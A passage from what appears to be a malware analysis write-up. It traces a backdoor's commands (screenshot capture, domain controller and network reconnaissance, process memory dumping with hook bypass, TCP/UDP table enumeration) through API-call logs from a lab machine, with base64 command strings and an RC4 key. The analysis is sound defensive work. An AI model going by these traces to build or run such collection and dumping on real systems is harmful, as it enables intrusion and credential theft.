[PAR] int x1     : 0x0
[PAR] int y1     : 0x0
[PAR] int rop    : 0xcc0020
[RET] [0x2ad61ab9660]

[CNT] [536]
[PTP] [0x1188] [0x18ec] [c:\windows\system32\rundll32.exe]
[API] <GetCursorInfo> in [USER32.dll] 
[PAR] PCURSORINFO pci : 0x000000DED296E160
[RET] [0x2ad61ab9683]

[CNT] [537]
[PTP] [0x1188] [0x18ec] [c:\windows\system32\rundll32.exe]
[API] <GetDesktopWindow> in [USER32.dll] 
[RET] [0x2ad61ab9697]

[CNT] [538]
[PTP] [0x1188] [0x18ec] [c:\windows\system32\rundll32.exe]
[API] <GetIconInfo> in [USER32.dll] 
[PAR] HICON     hIcon     : 0x10003
[PAR] PICONINFO piconinfo : 0x000000DED296E178
[RET] [0x2ad61ab96e2]

[CNT] [539]
[PTP] [0x1188] [0x18ec] [c:\windows\system32\rundll32.exe]
[API] <GetObjectW> in [GDI32.dll] 
[PAR] HANDLE h  : 0x4d050833
[PAR] int c     : 0x20
[PAR] LPVOID pv : 0x000000DED296E198
[RET] [0x2ad61ab9748]

[CNT] [540]
[PTP] [0x1188] [0x18ec] [c:\windows\system32\rundll32.exe]
[API] <DrawIconEx> in [USER32.dll] 
[PAR] HDC    hdc                : 0xFFFFFFFF9C010803
[PAR] int    xLeft              : 0x3cb
[PAR] int    yTop               : 0x1b0
[PAR] HICON  hIcon              : 0x10003
[PAR] int    cxWidth            : 0x20
[PAR] int    cyWidth            : 0x20
[PAR] UINT   istepIfAniCur      : 0x0
[PAR] HBRUSH hbrFlickerFreeDraw : 0x0
[PAR] UINT   diFlags            : 0x3
[RET] [0x2ad61ab9793]

[CNT] [541]
[PTP] [0x1188] [0x18ec] [c:\windows\system32\rundll32.exe]
[API] <CreateCompatibleDC> in [GDI32.dll] 
[PAR] HDC hdc : 0xb010914
[RET] [0x2ad61ab979c]

[CNT] [542]
[PTP] [0x1188] [0x18ec] [c:\windows\system32\rundll32.exe]
[API] <CreateCompatibleDC> in [gdi32full.dll] 
[RET] [0x2ad61ab979c]

[CNT] [543]
[PTP] [0x1188] [0x18ec] [c:\windows\system32\rundll32.exe]
[API] <CreateCompatibleBitmap> in [GDI32.dll] 
[PAR] HDC hdc : 0xb010914
[PAR] int cx  : 0x780
[PAR] int cy  : 0x438
[RET] [0x2ad61ab97c6]

[CNT] [544]
[PTP] [0x1188] [0x18ec] [c:\windows\system32\rundll32.exe]
[API] <SelectObject> in [GDI32.dll] 
[PAR] HDC     hdc : 0x3a0109a8
[PAR] HGDIOBJ h   : 0x3e050bab
[RET] [0x2ad61ab97da]

[CNT] [545]
[PTP] [0x1188] [0x18ec] [c:\windows\system32\rundll32.exe]
[API] <SetStretchBltMode> in [GDI32.dll] 
[PAR] HDC hdc  : 0x3a0109a8
[PAR] int mode : 0x4
[RET] [0x2ad61ab97ed]

[CNT] [546]
[PTP] [0x1188] [0x18ec] [c:\windows\system32\rundll32.exe]
[API] <StretchBlt> in [GDI32.dll] 
[PAR] HDC   hdcDest : 0x3a0109a8
[PAR] int   xDest   : 0x0
[PAR] int   yDest   : 0x0
[PAR] int   wDest   : 0x780
[PAR] int   hDest   : 0x438
[PAR] HDC   hdcSrc  : 0xFFFFFFFF9C010803
[PAR] int   xSrc    : 0x0
[PAR] int   ySrc    : 0x0
[PAR] int   wSrc    : 0x569
[PAR] int   hSrc    : 0x3a7
[PAR] DWORD rop     : 0xcc0020
[RET] [0x2ad61ab9833]

[CNT] [547]
[PTP] [0x1188] [0x18ec] [c:\windows\system32\rundll32.exe]
[API] <CreateStreamOnHGlobal> in [combase.dll] 
[PAR] HGLOBAL  hGlobal          : 0x0
[PAR] BOOL     fDeleteOnRelease : 0x1
[PAR] LPSTREAM *ppstm           : 0x000000DED296E130
[RET] [0x2ad61ab98a6]

[CNT] [548]
[PTP] [0x1188] [0x18ec] [c:\windows\system32\rundll32.exe]
[API] <IStream::Seek> in [combase.dll] 
[PAR] LARGE_INTEGER  dlibMove         : 0x0
[PAR] DWORD          dwOrigin         : 0x0
[PAR] ULARGE_INTEGER *plibNewPosition : 0x000000DED296E148
[RET] [0x2ad61ab98ef]

[CNT] [549]
[PTP] [0x1188] [0x18ec] [c:\windows\system32\rundll32.exe]
[API] <IStream::Stat> in [combase.dll] 
[PAR] STATSTG* pstatstg    : 0x000000DED296E1F0
[PAR] DWORD    grfStatFlag : 0x1
[RET] [0x2ad61ab990f]

[CNT] [550]
[PTP] [0x1188] [0x18ec] [c:\windows\system32\rundll32.exe]
[API] <IStream::Read> in [combase.dll] 
[PAR] void  *pv      : 0x000002AD632D0080
[PAR] ULONG cb       : 0x99bd5
[PAR] ULONG *pcbRead : 0x000000DED296E12C
[RET] [0x2ad61ab993e]

[CNT] [551]
[PTP] [0x1188] [0x18ec] [c:\windows\system32\rundll32.exe]
[API] <IStream::Release> in [combase.dll] 
[RET] [0x2ad61ab996c]

[CNT] [552]
[PTP] [0x1188] [0x18ec] [c:\windows\system32\rundll32.exe]
[API] <DeleteDC> in [GDI32.dll] 
[PAR] HDC hdc : 0x3a0109a8
[RET] [0x2ad61ab997a]

[CNT] [553]
[PTP] [0x1188] [0x18ec] [c:\windows\system32\rundll32.exe]
[API] <DeleteObject> in [GDI32.dll] 
[PAR] HGDIOBJ ho : 0x480509a5
[RET] [0x2ad61ab9988]

[CNT] [554]
[PTP] [0x1188] [0x18ec] [c:\windows\system32\rundll32.exe]
[API] <DeleteObject> in [GDI32.dll] 
[PAR] HGDIOBJ ho : 0x3e050bab
[RET] [0x2ad61ab9996]
```
**III. Result**  

```html
[CNT] [566]
[PTP] [0x1188] [0x18ec] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x000002AD63683040
[STR]        -> "419C"
[STR]           "iVBORw0KGgoAAAANSUhEUgAAB4AAAAQ4CAYAAADo08FDAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAP+lSURB"
[STR]           "VHhe7J0FmJ3F1cev33Xfze7GlWBJcIckSKHQltIWKC2F9ivF3bVFixVaSpGEBG1xd3cCcXfXjWclG4X/N2fe99w9d+68V1ZCAvs9z++ZmXPOnPfuku/hkl9n"
[STR]           "Xp/v0Xq0s4MyrBa+4XU7DP5hikfc8XvEN3QdfI+o3933iH+IYuj2i+/htfANUb+nHRS/ImDB99Aa+NXPtr1Bv+/Ag4qH4vE/uAa+B1br8fvG959V+rNYUbm4"
[STR]           "WhWjMZOfg/v7/6O43x1bGd+/V8J3v3rO94RfEbhP8e+W4fvXCvjvW9lsaL/vn8udMV1Uva0X4fRS+X+q9b3q5/zntiEo8N+zAoF7V1rxK4L3KP7hjmJOOdue"
[STR]           "dKHn+v6hfnY16rk7Bu5W/CM9fHfVwH+36pECqjP3ctysbUvoeb47lzkjz+9Y6sAxF/+dijvc0QPf7bSXemxD/r7Eea7J3xW3LVaovMLvge/WxfArAqpe4lcE"
[STR]           "b12C4C2LnZG5xd4nU3y3LNLPlgRU78DN6vm3tAz/zar/TernolERuGkRAjcudMZm4vvbAvhVj7bG54768ybB99f58NNnSgPfDfN0fatAva6f64wC/3WK6+34"
[STR]           "FAGVD1zrjgb+a1W/a+boMY5rVPy6JmidUOPiUwSunoPAVbOdMQV+Vee7cpYek+G7YmYTqj4pqsavRv0Z0uFKhdoTuELtcfFdNgP+y1UfC75Lp+t8DLWW+eCl"
[STR]           "issyx3/JdAQunZEWvoun6fq0oNqLpjpjBgQvVFxkJ6AIXTRFMdkd7QQumKT6TI7hP3+ijhE0lzkioAhdoDjfHT0InKf2nq96W/CfO0Hnm4vfHYPnKs5Rvc4e"
[STR]           "r8dk87bCf9Y4/RwbfkXwLMWZ7mgQOHMc/H8Zq0eToCJkIXDGGATVnuYQUITOUPzZHZtJ4P9GI/hn9Tkk/6f40yiFyqVB4I+jNGbMf/rIWE6j1r7TvtFxztHI"
[STR]           "e2Ixtz6oagOKoIqH1DpdeI8X/j98rWtS87X6DGrPH9T81K/h+91X8J3ypR79vx+hR4ozwd9/jdDvFDQaBH83AoFTvtJjUO0L/lbFTlaoMXDyCIRO+aZZ8H7d"
[STR]           "LwMC7hg6SaE+h0nwJPV5T1SfU41M6DdfIqRiyQi6NRHVgwirfTxyTeDXX+g6gua+Ez6LQ+a5J8do5D6yn/9Xn2uohp6ln/ebrxBOk+CvVN9fq+dlSOAE9Uy1"
[STR]           "l+F1qlpzH30GquG1/5fqd3H8p/D94hMNrQlzXyoC9DtRY1gR+uXnCJ+g5org8Z/pNY2BX3waG4nQ8apOEPy5iv1C1SsCP/skBse5LvLLLxA94Us9ErzXf9zH"
[STR]           "8B37kYbmtJf7UZ570Uh5Qsa5luE413jlCH6e5rhPEPnZp5qwmDOhYz9OCu2xEVJE1LMi9BnUc8JqLqE4EaXfkRqD9Jnod/HTD2PwmnKcp776Gcc2PSsV8nPy"
[STR]           "3PwZzJ/b3GfWcJ4I/vQjBI5Rn1ONjP/oD2JQLvRT1csgdIyqPVrl1CgxY+Y+SSZ52TMZQUVYfYbwTz5wRkHwqPcTMGtCal+yHGHGJbSP67iXWcNxHonAke8l"
[STR]           "7E0F15v9Y/xEoWrCR6kaC6Ej1bOPeA+Bw9+Ff/A7eqQ1xSNqb/Toj2LQmusJquc9FJc57mNb05zhNe8nIocrjnAIDX4X4cPf0wQHvaPXNAYGvq2htaxhOC7z"
[STR]           [TRUNCATED]
[PAR] DWORD  cbBinary   : 0x199f9a
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x000002AD63820040
[PAR] DWORD* pcchString : 0x000000DED296E20C
[RET] [0x2ad61ace028]
```

<a id="GetDomainControlerInfo"></a>
# GetDomainControlerInfo  

```php
function GetDomainControlerInfo()
{
	$cmd_id = "\xcb\xe3;
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Order**  

```html
[CNT] [327]
[PTP] [0x930] [0x334] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x00000073510FAEB0
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+baDYErJ4Hw/Yqg=="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x0000007351114C90
[PAR] DWORD   *pcbBinary : 0x000000735315EB6C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x73530bbea1]
```

**II. Execution**  

```html
[CNT] [432]
[PTP] [0xd3c] [0xd48] [c:\windows\system32\rundll32.exe]
[API] <DsGetDcNameW> in [LOGONCLI.DLL] 
[PAR] LPCWSTR                   ComputerName         : 0x0 (null)
[PAR] LPCWSTR                   DomainName           : 0x0 (null)
[PAR] GUID*                     DomainGuid           : 0x0
[PAR] LPWCSTR                   SiteName             : 0x0 (null)
[PAR] ULONG                     Flags                : 0x0
[PAR] PDOMAIN_CONTROLLER_INFOW* DomainControllerInfo : 0x00000003D557EC48
[RET] [0x3d54dbf68]

[CNT] [433]
[PTP] [0xd3c] [0xd48] [c:\windows\system32\rundll32.exe]
[API] <DsGetDcOpenW> in [LOGONCLI.DLL] 
[PAR] LPCWSTR DnsName         : 0x00000003D359DD88
[STR]         -> "mylab.local"
[PAR] ULONG   OptionFlags     : 0x2 (DS_NOTIFY_AFTER_SITE_RECORDS)
[PAR] LPCWSTR SiteName        : 0x0 (null)
[PAR] GUID*   DomainGuid      : 0x0
[PAR] LPCWSTR DnsForestName   : 0x0
[PAR] ULONG   DcFlags         : 0x0 
[PAR] PHANDLE RetGetDcContext : 0x00000003D557EC50
[RET] [0x3d54dbfab]

[CNT] [434]
[PTP] [0xd3c] [0xd48] [c:\windows\system32\rundll32.exe]
[API] <NetUserModalsGet> in [SAMCLI.DLL] 
[PAR] LMSTR   servername    : 0x00000003D359DD40
[STR]         -> "\\MYDC.mylab.local"
[PAR] DWORD   level         : 0
[PAR] LPBYTE* bufptr        : 0x00000003D557EC60
[RET] [0x3d54dc046]

[CNT] [451]
[PTP] [0xd3c] [0xd48] [c:\windows\system32\rundll32.exe]
[API] <NetUserModalsGet> in [SAMCLI.DLL] 
[PAR] LMSTR   servername    : 0x00000003D359DD40
[STR]         -> "\\MYDC.mylab.local"
[PAR] DWORD   level         : 3
[PAR] LPBYTE* bufptr        : 0x00000003D557EC68
[RET] [0x3d54dc13d]

[CNT] [468]
[PTP] [0xd3c] [0xd48] [c:\windows\system32\rundll32.exe]
[API] <DsGetDcNextW> in [LOGONCLI.DLL] 
[PAR] HANDLE            GetDcContextHandle : 0x00000003D357FE70
[PAR] PULONG            SockAddressCount   : 0x00000003D557EC3C
[PAR] LPSOCKET_ADDRESS* SockAddresses      : 0x00000003D557EC78
[PAR] LPWSTR*           DnsHostName        : 0x00000003D557EC70
[RET] [0x3d54dc252]

```

**III. Result**  

```html
[CNT] [483]
[PTP] [0xd3c] [0xd48] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x00000003D35A4F50
[STR]        -> "CBE3"
[STR]           "mylab.local mylab.local Default-First-Site-Name Default-First-Site-Name \\MYDC.mylab.local \\192.168.30.5 24 42 1 7 0 30"
[STR]           " 30"
[STR]           "mydc.mylab.local"
[PAR] DWORD  cbBinary   : 0x124
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x00000003D357DD60
[PAR] DWORD* pcchString : 0x00000003D557EB3C
[RET] [0x3d54de028]
```

<a id="GetNetworkAdaptersInfo"></a>
# GetNetworkAdaptersInfo  

**I. Order**  

```html
[CNT] [829]
[PTP] [0x9e0] [0xb68] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x0000004EAA118470
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+Uv3MErJ4Hw/Yqg=="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x0000004EAA129950
[PAR] DWORD   *pcbBinary : 0x0000004EAC07E94C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x4eabfdbea1]
```

**II. Execution**  

```html
[CNT] [843]
[PTP] [0x9e0] [0xb68] [c:\windows\system32\rundll32.exe]
[API] <GetNetworkParams> in [iphlpapi.dll] 
[PAR] PFIXED_INFO pFixedInfo : 0x0000004EAA135760
[PAR] PULONG      pOutBufLen : 0x0000004EAC07E7F0
[RET] [0x4eabfe0dc4]

[CNT] [879]
[PTP] [0x9e0] [0xb68] [c:\windows\system32\rundll32.exe]
[API] <GetAdaptersInfo> in [iphlpapi.dll] 
[PAR] PIP_ADAPTER_INFO AdapterInfo : 0x0000004EAA10FE30
[PAR] PULONG           SizePointer : 0x0000004EAC07E7F4
[RET] [0x4eabfe0f9b]

[CNT] [936]
[PTP] [0x9e0] [0xb68] [c:\windows\system32\rundll32.exe]
[API] <_localtime64_s> in [msvcrt.dll] 
[PAR] tm*         _Tm   : 0x0000004EAC07E83C
[PAR] __time64_t* _Time : 0x0000004EAA1100E8
[RET] [0x4eabfe1225]

[CNT] [937]
[PTP] [0x9e0] [0xb68] [c:\windows\system32\rundll32.exe]
[API] <asctime_s> in [msvcrt.dll] 
[PAR] char*            _Buffer      : 0x0000004EAC07E81C
[PAR] size_t           _SizeInBytes : 0x20
[PAR] struct tm const* _Tm          : 0x0000004EAC07E83C
[RET] [0x4eabfe123e]
```

**III. Result**  

```html
[CNT] [948]
[PTP] [0x9e0] [0xb68] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x0000004EAA102650
[STR]        -> "16F6"
[STR]           "home  8 NA 0 0 0"
[STR]           "6 {54BD383F-B0DD-43E2-87FF-399DE077C35F} Carte Intel(R) PRO/1000 MT pour station de travail|"
[STR]           "08-00-27-8E-BA-05 1 169.254.143.85 255.255.0.0 0.0.0.0 0.0.0.0  |Thu Jan 01 01:00:00 1970|Thu Jan 01 01:00:00 1970"
[PAR] DWORD  cbBinary   : 0x1ca
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x0000004EAA13B5A0
[PAR] DWORD* pcchString : 0x0000004EAC07E72C
[RET] [0x4eabfde028]
```

<a id="ExitThread"></a>
# ExitThread  

Self-explanatory. Not quite sure about the use case though.   

<a id="GetMemoryDump"></a>
# GetMemoryDump  

I tried a memory dump on explorer.exe :  

**I. Order**  

```html
[CNT] [361]
[PTP] [0xaf4] [0xae0] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x000000C997BB3BB0
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+Ws7+SMQANg/Z0G+yJFVm92kWXjNHwdzTJtM="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x000000C997BB71F0
[PAR] DWORD   *pcbBinary : 0x000000C999B2EB6C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0xc999a8bea1]
```

**II. Execution**  

```html
[CNT] [385]
[PTP] [0xaf4] [0x32c] [c:\windows\system32\rundll32.exe]
[API] <CreateToolhelp32Snapshot> in [KERNEL32.DLL] 
[PAR] DWORD dwFlags       : 0x2 ( TH32CS_SNAPPROCESS)
[PAR] DWORD th32ProcessID : 0x0
[RET] [0xc999a8ed24]

[CNT] [386]
[PTP] [0xaf4] [0x32c] [c:\windows\system32\rundll32.exe]
[API] <Process32FirstW> in [KERNEL32.DLL] 
[PAR] HANDLE            hSnapshot : 0x304
[PAR] LPPROCESSENTRY32W lppe      : 0x000000C99A09EC68
[RET] [0xc999a8ed43]

[ * ] [pid 0xaf4][tid 0x32c] c:\windows\system32\rundll32.exe
[API] <Process32NextW>
[PAR] LPPROCESSENTRY32W lppe : 0x000000C99A09EC68
[FLD]                   -> th32ProcessID = 0x4
[FLD]                   -> szExeFile     = "System"
[RES] BOOL 0x1

[...]

[ * ] [pid 0xaf4][tid 0x32c] c:\windows\system32\rundll32.exe
[API] <Process32NextW>
[PAR] LPPROCESSENTRY32W lppe : 0x000000C99A09EC68
[FLD]                   -> th32ProcessID = 0x804
[FLD]                   -> szExeFile     = "explorer.exe"
[RES] BOOL 0x1

[CNT] [424]
[PTP] [0xaf4] [0x32c] [c:\windows\system32\rundll32.exe]
[/!\] [ Attempt to bypass hooked API detected ! ]
[API] <NtOpenProcessToken> in [ntdll.dll] 
[PAR] HANDLE      ProcessHandle : 0xFFFFFFFFFFFFFFFF
[PAR] ACCESS_MASK DesiredAccess : 0x8 (TOKEN_QUERY)
[PAR] PHANDLE     TokenHandle   : 0x000000C99A09EC78
[RET] [0xc999aa4b2f]

[CNT] [425]
[PTP] [0xaf4] [0x32c] [c:\windows\system32\rundll32.exe]
[API] <LookupPrivilegeValueA> in [ADVAPI32.dll] 
[PAR] LPCTSTR lpSystemName : 0x0 (null)
[PAR] LPCTSTR lpName       : 0x000000C99A09EC8B
[STR]         -> "SeDebugPrivilege"
[RET] [0xc999a8a385]

[CNT] [426]
[PTP] [0xaf4] [0x32c] [c:\windows\system32\rundll32.exe]
[API] <PrivilegeCheck> in [ADVAPI32.dll] 
[PAR] HANDLE         ClientToken        : 0x304
[PAR] PPRIVILEGE_SET RequiredPrivileges : 0x000000C99A09EC9C
[PAR] LPBOOL         pfResult           : 0x000000C99A09EC74
[RET] [0xc999a8a3c9]

[CNT] [429]
[PTP] [0xaf4] [0x32c] [c:\windows\system32\rundll32.exe]
[/!\] [ Attempt to bypass hooked API detected ! ]
[API] <NtOpenProcess> in [ntdll.dll] 
[PAR] PHANDLE             ProcessHandle    : 0x000000C99A09EDB0
[PAR] ACCESS_MASK         DesiredAccess    : 0x410 (PROCESS_VM_READ | PROCESS_QUERY_INFORMATION)
[PAR] POBJECT_ATTRIBUTES  ObjectAttributes : 0x000000C99A09EE40
[PAR] PCLIENT_ID          ClientId         : 0x000000C99A09EE20
[RET] [0xc999aa4aab]

[CNT] [433]
[PTP] [0xaf4] [0x32c] [c:\windows\system32\rundll32.exe]
[/!\] [ Attempt to bypass hooked API detected ! ]
[API] <NtCreateFile> in [ntdll.dll] 
[PAR] PHANDLE            FileHandle       : 0x000000C99A09EDB8
[PAR] ACCESS_MASK        DesiredAccess    : 0x12019f 
[PAR] POBJECT_ATTRIBUTES ObjectAttributes : 0x000000C99A09EE40
[FLD]                    -> ObjectName = "\??\C:\Users\Public\cache"
[PAR] PIO_STATUS_BLOCK  IoStatusBlock     : 0x000000C99A09EE10
[PAR] PLARGE_INTEGER    AllocationSize    : 0x000000C99A09EDF0
[PAR] ULONG             FileAttributes    : 0x80
[PAR] ULONG             ShareAccess       : 0x3 (FILE_SHARE_READ | FILE_SHARE_WRITE)
[PAR] ULONG             CreateDisposition : 0x5 (FILE_DOES_NOT_EXIST)
[PAR] ULONG             CreateOptions     : 0x20 (FILE_SYNCHRONOUS_IO_NONALERT)
[RET] [0xc999aa421a]

[CNT] [455]
[PTP] [0xaf4] [0x32c] [c:\windows\system32\rundll32.exe]
[API] <SymInitializeW> in [dbghelp.dll] 
[PAR] HANDLE hProcess       : 0x304 
[PAR] PWSTR  UserSearchPath : 0x0 (null)
[PAR] BOOL   fInvadeProcess : 0x1
[RET] [0xc999a9ebe0]

[CNT] [460]
[PTP] [0xaf4] [0x32c] [c:\windows\system32\rundll32.exe]
[/!\] [ Attempt to bypass hooked API detected ! ]
[API] <NtQuerySystemInformation> in [ntdll.dll] 
[PAR] SYSTEM_INFORMATION_CLASS SystemInformationClass  : 0x5 (SystemProcessInformation)
[PAR] PVOID                    SystemInformation       : 0x000000C99F333650
[PAR] ULONG                    SystemInformationLength : 0x10000
[PAR] PULONG                   ReturnLength            : 0x0
[RET] [0xc999aa4f0d]

[CNT] [461]
[PTP] [0xaf4] [0x32c] [c:\windows\system32\rundll32.exe]
[API] <EnumerateLoadedModulesW64> in [dbghelp.dll] 
[PAR] HANDLE                          hProcess                  : 0x304 
[PAR] PENUMLOADED_MODULES_CALLBACKW64 EnumLoadedModulesCallback : 0x000000C999A8E100
[PAR] PVOID                           UserContext               : 0x000000C99A09EC70
[RET] [0xc999a9ec9c]

[CNT] [935]
[PTP] [0xaf4] [0x32c] [c:\windows\system32\rundll32.exe]
[API] <SymCleanup> in [dbghelp.dll] 
[RET] [0xc999a9edc4]

[CNT] [936]
[PTP] [0xaf4] [0x32c] [c:\windows\system32\rundll32.exe]
[API] <GetFileSizeEx> in [KERNEL32.DLL] 
[PAR] HANDLE         hFile      : 0x314
[PAR] PLARGE_INTEGER lpFileSize : 0x000000C99A09EDF8
[RET] [0xc999a975d3]

[CNT] [937]
[PTP] [0xaf4] [0x32c] [c:\windows\system32\rundll32.exe]
[/!\] [ Attempt to bypass hooked API detected ! ]
[API] <NtCreateSection> in [ntdll.dll] 
[PAR] PHANDLE            SectionHandle         : 0x000000C99A09EDC8
[PAR] ACCESS_MASK        DesiredAccess         : 0x4 (SECTION_MAP_READ)
[PAR] POBJECT_ATTRIBUTES ObjectAttributes      : 0x0
[PAR] PLARGE_INTEGER     MaximumSize           : 0x000000C99A09EDF0
[PAR] ULONG              SectionPageProtection : 0x2
[PAR] ULONG              AllocationAttributes  : 0x8000000
[PAR] HANDLE             FileHandle            : 0x314
[RET] [0xc999aa4324]

[CNT] [938]
[PTP] [0xaf4] [0x32c] [c:\windows\system32\rundll32.exe]
[/!\] [ Attempt to bypass hooked API detected ! ]
[API] <NtMapViewOfSection> in [ntdll.dll] 
[PAR] HANDLE SectionHandle  : 0x304
[PAR] HANDLE ProcessHandle  : 0xFFFFFFFFFFFFFFFF
[PAR] PVOID  *BaseAddress   : 0x000000C99A09EDA8 (0x0000000000000000)
[PAR] ULONG  Protect        : 0x2(PAGE_READONLY)
[RET] [0xc999aa491d]
```

**III. Result**  

```html
[CNT] [2608]
[PTP] [0x604] [0x7e4] [c:\windows\system32\rundll32.exe]
[API] <SystemFunction032> in [CRYPTSP.DLL] 
[INF] [ Undocumented RC4 implementation ]
[PAR] PBINARY_STRING buffer : 0x000000D017D2F120
[FLD]                -> Length    = 0xa6b34
[FLD]                -> MaxLength = 0xa6b34
[FLD]                -> Buffer    = 0x000000D01C43E010
[STR]                -> "{"cds":{"auth":"OV1T557KBIUECUM5"},"dt":{"chkin":"TURNUJOnAAAEAAAAIAAAAAAAAADQAAAAAgAAAAAAAAAHAAAAOAAAAFAAAAAEAAAAgFYAAI"
[STR]                   "wAAAAJAAAAIGsAALSRAAAAAAAAAAAAAAAAAAAJAAYACToCAQYAAAADAAAAgCUAAAIAAACIAAAAEAAAAEx3wgAAAAAAAAAAAAAAAAAA4dQX0AAAAAAAAADNAA"
[STR]                   "AAAABpDPZ/AAAAECYATiYnADo6UFQMVwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
[STR]                   "AAAAAAAAAAAAAAAAAAAAAAAAAAAABPPv9/AAAAwBoAvMYaAJ5VUFRAVwAAvQTv/gAAAQADAAYAB0SAJQMABgAHRIAlPwAAAAAAAAAEAAQAAgAAAAAAAAAAAA"
[STR]                   "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB5Pf9/AAAA4BMA7A8UAMpUUFSAVwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
[STR]                   "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB3O/9/AAAAUBEAXE0RADdXUFTGVwAAvQTv/gAAAQADAA"
[STR]                   "YAB0SAJQMABgAHRIAlPwAAAAAAAAAEAAQAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAeOv9/AAAA4AgA368IAK"
[STR]                   "VUUFQQWAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
[STR]                   "AAAACrPf9/AAAAoAoAtAULAP5VUFRUWAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
[STR]                   "AAAAAAAAAAAAAAAAAAAAAAAAAAAABCPv9/AAAAEAwAmtUMAK1CUFSWWAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
[STR]                   "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADWO/9/AAAAECEACUohAPlEUFTcWAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
[STR]                   "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABfO/9/AAAAYAQA9+gEAIJCUFQgWQAAAAAAAAAAAAAAAA"
[STR]                   "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAVPP9/AAAAoAoAMGgLAB"
[STR]                   "FUUFRmWQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
[STR]                   "[TRUNCATED]"
[PAR] PBINARY_STRING key    : 0x000000D017D2F110
[FLD]                -> Length    = 0x10
[FLD]                -> MaxLength = 0x10
[FLD]                -> Buffer    = 0x000000D015E5CEA0
[STR]                -> "S47EFEUO3D2O6641"
[RET] [0xd017d34c35]
```
<a id="GetTcpUdpTables"></a>
# GetTcpUdpTables  

**I. Order**  

```html
[CNT] [395]
[PTP] [0xb20] [0xa04] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x0000004A4DC96A40
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+W+nYErJ4Hw/Yqg=="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x0000004A4DCAB8C0
[PAR] DWORD   *pcbBinary : 0x0000004A4FB5E9FC
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x4a4f92bea1]
```
**II. Execution**  

```html
[CNT] [410]
[PTP] [0xb20] [0xa04] [c:\windows\system32\rundll32.exe]
[API] <GetExtendedTcpTable> in [iphlpapi.dll] 
